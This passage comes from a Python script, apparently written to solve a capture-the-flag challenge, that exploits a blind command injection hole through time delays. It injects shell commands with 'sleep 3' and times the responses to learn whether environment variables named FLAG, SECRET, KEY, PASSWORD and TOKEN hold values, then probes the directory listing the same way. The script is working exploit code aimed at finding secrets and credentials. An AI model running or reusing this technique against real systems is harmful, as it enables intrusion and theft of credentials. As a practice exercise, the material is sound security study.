            print(f"  [!] Needs manual extraction: {pattern}")

# Final attempt: Try to read environment variables that might contain flags
print("\n[STEP 5] Checking environment variables")

env_vars = ["FLAG", "SECRET", "KEY", "PASSWORD", "TOKEN"]
for var in env_vars:
    test_cmd = f"echo ${{ {var} }} | grep -v '^$' && sleep 3"
    elapsed = test_command(test_cmd)
    
    if elapsed >= 2.5:
        print(f"  [+] Environment variable {var} appears to have content")

# Try a command to list current directory and see if anything stands out
print("\n[STEP 6] Listing current directory")
cmd = "ls -la | wc -l"
test_cmd = f"ls -la | wc -l | grep -E '[0-9]+' && sleep 3"
elapsed = test_command(test_cmd)
print(f"Directory listing test: {elapsed:.2f}s")

print("\n[*] Blind command injection extraction completed")
print("[*] Review the discoveries above for potential flag locations")
